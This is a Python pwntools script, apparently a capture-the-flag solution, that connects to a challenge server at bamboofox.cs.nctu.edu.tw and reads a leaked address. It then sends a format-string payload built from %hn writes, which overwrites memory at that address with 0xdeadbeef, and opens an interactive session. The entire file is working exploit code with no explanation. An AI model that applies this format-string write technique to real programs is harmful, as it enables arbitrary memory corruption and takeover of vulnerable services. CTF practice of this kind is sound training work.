from pwn import *

p = remote( "bamboofox.cs.nctu.edu.tw", 12022 )

p.recvuntil( ": " )
add = int( p.recvuntil( "\n" )[:-1], 16)
print( hex(add) )

#payload = b"%9$saaaa" + p64( add )

#p.sendline( payload )

def fmt( prev, val, idx ):
	result = b''
	if prev < val:
		result += b'%' + bytes( str( val - prev ), 'utf-8' ) + b'c'
	elif prev == val:
		result += b''
	else:
		result += b'%' + bytes( str( val - prev + 256 * 256 ), 'utf-8' ) + b'c'
	result += b'%' + bytes( str( idx ), 'utf-8' ) + b'$hn'
	return result

target = 0xdeadbeef
prev = 0

payload = b''

for i in range( 2 ):
	payload += fmt( prev, ( target >> i * 16) &0xffff, i + 12 )
	prev = target >> ( i * 16 ) & 0xffff

payload = payload.ljust( 0x20, b'a' ) + p64( add ) + p64( add + 2 )
print( len( payload ) )
print( payload )

p.sendline( payload )

p.interactive()

